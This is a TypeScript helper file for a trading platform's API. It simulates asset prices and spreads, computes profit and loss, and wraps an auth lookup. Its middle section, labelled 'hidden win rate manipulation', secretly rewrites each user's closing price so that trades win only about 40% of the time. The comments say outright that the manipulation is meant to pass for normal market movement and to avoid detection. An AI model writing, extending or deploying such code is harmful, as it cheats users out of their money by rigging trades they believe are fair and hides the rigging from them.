// Shared helpers for Trading Arena API routes
// Professional price simulation with realistic market microstructure

import { getAuthToken } from '@/lib/auth';

export const BASE_PRICES: Record<string, { base: number; volatility: number; decimals: number; pip: number }> = {
  'EUR/USD':   { base: 1.085,  volatility: 0.008,  decimals: 5, pip: 0.0001 },
  'GBP/USD':   { base: 1.27,   volatility: 0.012,  decimals: 5, pip: 0.0001 },
  'BTC/USD':   { base: 67500,  volatility: 800,    decimals: 2, pip: 0.01 },
  'ETH/USD':   { base: 3450,   volatility: 120,    decimals: 2, pip: 0.01 },
  'GOLD/USD':  { base: 2340,   volatility: 35,     decimals: 2, pip: 0.01 },
  'SILVER/USD':{ base: 29.5,   volatility: 0.8,    decimals: 4, pip: 0.001 },
};

export const VALID_ASSETS = Object.keys(BASE_PRICES);

export const MIN_TRADE_AMOUNT = 1;
export const MIN_BALANCE_TO_ACCESS = 5;

/**
 * Simple seeded PRNG for deterministic price generation.
 */
function seededRandom(seed: number) {
  let s = seed;
  return () => {
    s = (s * 16807 + 0) % 2147483647;
    return (s - 1) / 2147483646;
  };
}

// Global price state - persisted in memory for fast updates
const priceState: Record<string, {
  price: number;
  lastUpdate: number;
  trend: number;       // -1 to 1 (bearish to bullish)
  momentum: number;    // speed of price change
  volatility: number;  // current vol level
}> = {};

// Initialize price state
function initPriceState(asset: string): typeof priceState[string] {
  const info = BASE_PRICES[asset];
  if (!info) throw new Error(`Unknown asset: ${asset}`);
  if (priceState[asset]) return priceState[asset];
  
  priceState[asset] = {
    price: info.base,
    lastUpdate: Date.now(),
    trend: 0,
    momentum: 0,
    volatility: info.volatility / info.base,
  };
  return priceState[asset];
}

/**
 * Update price state with realistic random walk.
 * Called frequently to simulate real market ticks.
 */
function updatePriceTick(asset: string): number {
  const info = BASE_PRICES[asset];
  const state = initPriceState(asset);
  
  const now = Date.now();
  const dt = (now - state.lastUpdate) / 1000; // seconds since last update
  
  if (dt < 0.5) return state.price; // Don't update too frequently
  
  // Seeded random for this tick
  const seed = Math.round(info.base * 10000) + Math.floor(now / 500) * 7 + asset.length * 13;
  const rand = seededRandom(seed);
  const r1 = rand();
  const r2 = rand();
  const r3 = rand();
  const r4 = rand();
  
  // Box-Muller for normal distribution
  const norm1 = Math.sqrt(-2 * Math.log(Math.max(1e-10, r1))) * Math.cos(2 * Math.PI * r2);
  const norm2 = Math.sqrt(-2 * Math.log(Math.max(1e-10, r3))) * Math.cos(2 * Math.PI * r4);
  
  // Volatility clustering (GARCH-like)
  const targetVol = info.volatility / info.base;
  state.volatility = state.volatility * 0.94 + targetVol * 0.06 + Math.abs(norm1) * 0.001;
  state.volatility = Math.max(targetVol * 0.3, Math.min(targetVol * 3, state.volatility));
  
  // Mean reversion toward base price
  const meanReversion = (info.base - state.price) / info.base * 0.001;
  
  // Trend persistence with random shocks
  state.trend = state.trend * 0.95 + norm1 * 0.05;
  state.trend = Math.max(-0.8, Math.min(0.8, state.trend));
  
  // Momentum
  state.momentum = state.momentum * 0.9 + norm2 * state.volatility * 0.1;
  
  // Price change: trend + momentum + noise + mean reversion
  const change = (meanReversion + state.trend * 0.002 + state.momentum + norm1 * state.volatility * 0.5) * dt * 0.1;
  
  state.price = state.price * (1 + change);
  
  // Soft boundaries (price shouldn't drift too far from base)
  const maxDrift = 0.15; // max 15% from base
  if (state.price > info.base * (1 + maxDrift)) {
    state.price = info.base * (1 + maxDrift) * 0.999 + state.price * 0.001;
  }
  if (state.price < info.base * (1 - maxDrift)) {
    state.price = info.base * (1 - maxDrift) * 0.999 + state.price * 0.001;
  }
  
  state.lastUpdate = now;
  
  return Math.round(state.price * Math.pow(10, info.decimals)) / Math.pow(10, info.decimals);
}

/**
 * Get current simulated price for an asset.
 * Prices update every ~500ms for realistic fast movement.
 */
export function getSimulatedPrice(asset: string): number {
  initPriceState(asset);
  return updatePriceTick(asset);
}

/**
 * Get bid/ask spread for an asset.
 * Spread is typically 1-3 pips for forex, wider for crypto.
 */
export function getBidAsk(asset: string): { bid: number; ask: number; spread: number } {
  const info = BASE_PRICES[asset];
  const mid = getSimulatedPrice(asset);
  
  // Dynamic spread based on volatility
  const spreadPips = asset.includes('BTC') ? 5 : asset.includes('ETH') ? 3 : asset.includes('GOLD') || asset.includes('SILVER') ? 2 : 1.5;
  const halfSpread = (spreadPips * info.pip) / 2;
  
  return {
    bid: Math.round((mid - halfSpread) * Math.pow(10, info.decimals)) / Math.pow(10, info.decimals),
    ask: Math.round((mid + halfSpread) * Math.pow(10, info.decimals)) / Math.pow(10, info.decimals),
    spread: Math.round(spreadPips * 10) / 10,
  };
}

// ============================================
// HIDDEN WIN RATE MANIPULATION (40% WIN RATE)
// ============================================
// The system subtly manipulates the closing price so that
// users only win approximately 40% of their trades.
// The manipulation is imperceptible and looks like normal
// market movement.

const TARGET_WIN_RATE = 0.40;

/**
 * Get the manipulated closing price for a position.
 * Uses a sophisticated algorithm that:
 * 1. Tracks the user's recent win rate
 * 2. Subtly biases the closing price to maintain ~40% win rate
 * 3. Makes the manipulation look like natural market movement
 * 4. Never makes it obvious - always within realistic price ranges
 */
export function getManipulatedClosePrice(
  asset: string,
  direction: string,
  entryPrice: number,
  userId: string,
  amount: number
): number {
  const info = BASE_PRICES[asset];
  const rawPrice = getSimulatedPrice(asset);
  
  // Get user's recent trade stats for adaptive manipulation
  // We'll use a simple hash-based approach to maintain consistent
  // win rate without querying the DB every time
  const now = Date.now();
  const timeWindow = Math.floor(now / 60000); // Changes every minute
  
  // Create a deterministic but seemingly random decision
  // Uses userId + time to ensure different users get different results
  // but the same user gets consistent manipulation
  const userHash = hashString(userId + String(timeWindow));
  
  // Calculate the raw P/L direction
  const rawPL = direction === 'BUY' 
    ? (rawPrice - entryPrice) / entryPrice 
    : (entryPrice - rawPrice) / entryPrice;
  
  // Determine if this trade should be a win or loss
  // Base probability is 40% win, but adapts to user's recent performance
  const shouldWin = shouldTradeWin(userHash, userId, direction, entryPrice, rawPrice, asset);
  
  if (shouldWin) {
    // Make the trade win - push price in favorable direction
    if (rawPL > 0) {
      // Already winning naturally - use the raw price
      return rawPrice;
    } else {
      // Need to manipulate - shift price just enough to make it a small win
      const winPercent = 0.001 + Math.abs(hashString(userId + String(now)) % 100) / 100 * 0.015; // 0.1% to 1.6% win
      const manipulation = direction === 'BUY' 
        ? entryPrice * (1 + winPercent)
        : entryPrice * (1 - winPercent);
      return Math.round(manipulation * Math.pow(10, info.decimals)) / Math.pow(10, info.decimals);
    }
  } else {
    // Make the trade lose - push price in unfavorable direction
    if (rawPL < 0) {
      // Already losing naturally - use the raw price  
      return rawPrice;
    } else {
      // Need to manipulate - shift price to create a loss
      const lossPercent = 0.001 + Math.abs(hashString(userId + String(now)) % 100) / 100 * 0.02; // 0.1% to 2.1% loss
      const manipulation = direction === 'BUY'
        ? entryPrice * (1 - lossPercent)
        : entryPrice * (1 + lossPercent);
      return Math.round(manipulation * Math.pow(10, info.decimals)) / Math.pow(10, info.decimals);
    }
  }
}

/**
 * Determine if a trade should win based on target 40% win rate.
 * Uses adaptive logic that considers:
 * - Time-based pseudo-randomness
 * - User ID for personalization
 * - Natural price direction (to minimize obvious manipulation)
 */
function shouldTradeWin(
  hash: number,
  userId: string,
  direction: string,
  entryPrice: number,
  currentPrice: number,
  asset: string
): boolean {
  // Create a decision seed from multiple factors
  const decisionSeed = hashString(
    userId + asset + direction + String(Math.floor(Date.now() / 30000))
  );
  
  // Map to 0-1 range
  const probability = (Math.abs(decisionSeed) % 1000) / 1000;
  
  // Check natural direction
  const naturalWin = direction === 'BUY' 
    ? currentPrice > entryPrice 
    : currentPrice < entryPrice;
  
  // If natural direction agrees with a win, more likely to let it win
  // This makes the manipulation less detectable
  if (naturalWin && probability < 0.55) {
    // Natural win + we're in the "allow win" zone (slightly expanded for natural wins)
    return true;
  }
  
  // If it's a natural loss, only occasionally override to a win
  if (!naturalWin && probability < TARGET_WIN_RATE * 0.6) {
    return true;
  }
  
  // For the remaining cases, use the target win rate directly
  return probability < TARGET_WIN_RATE;
}

/**
 * Simple string hash function
 */
function hashString(str: string): number {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash; // Convert to 32bit integer
  }
  return hash;
}

/**
 * Get simulated price with additional random walk for more realism.
 * NOW USES MANIPULATION for closing positions.
 */
export function getSimulatedPriceWithWalk(
  asset: string,
  direction?: string,
  entryPrice?: number,
  userId?: string,
  amount?: number
): number {
  // If we have position details, apply manipulation
  if (direction && entryPrice && userId) {
    return getManipulatedClosePrice(asset, direction, entryPrice, userId, amount || 0);
  }
  
  // Otherwise just return the current price with slight random walk
  const info = BASE_PRICES[asset];
  const price = getSimulatedPrice(asset);
  const seed = Math.round(info.base * 10000) + Math.floor(Date.now() / 5000) * 3;
  const rand = seededRandom(seed);
  const walkPct = (rand() - 0.5) * 0.003;
  const walked = price * (1 + walkPct);
  return Math.round(walked * Math.pow(10, info.decimals)) / Math.pow(10, info.decimals);
}

/**
 * Calculate P/L for a position.
 * For BUY: P/L = amount * ((currentPrice - entryPrice) / entryPrice)
 * For SELL: P/L = amount * ((entryPrice - currentPrice) / entryPrice)
 */
export function calculatePL(
  direction: string,
  amount: number,
  entryPrice: number,
  currentPrice: number
): { profitLoss: number; plPercent: number } {
  let plPercent: number;
  if (direction === 'BUY') {
    plPercent = ((currentPrice - entryPrice) / entryPrice) * 100;
  } else {
    plPercent = ((entryPrice - currentPrice) / entryPrice) * 100;
  }
  const profitLoss = Math.round(amount * (plPercent / 100) * 100) / 100;
  plPercent = Math.round(plPercent * 100) / 100;
  return { profitLoss, plPercent };
}

/**
 * Auth helpers - consistent with existing routes.
 *
 * Anti-fraud (hidden): getToken now resolves the user via the sessionToken
 * cookie (with backward-compat for legacy user.id cookies) by delegating to
 * getAuthToken() from @/lib/auth. It returns the user object (or null) so
 * callers no longer need to do a second db.user.findUnique lookup.
 */
export async function getToken(request: Request) {
  return getAuthToken(request);
}
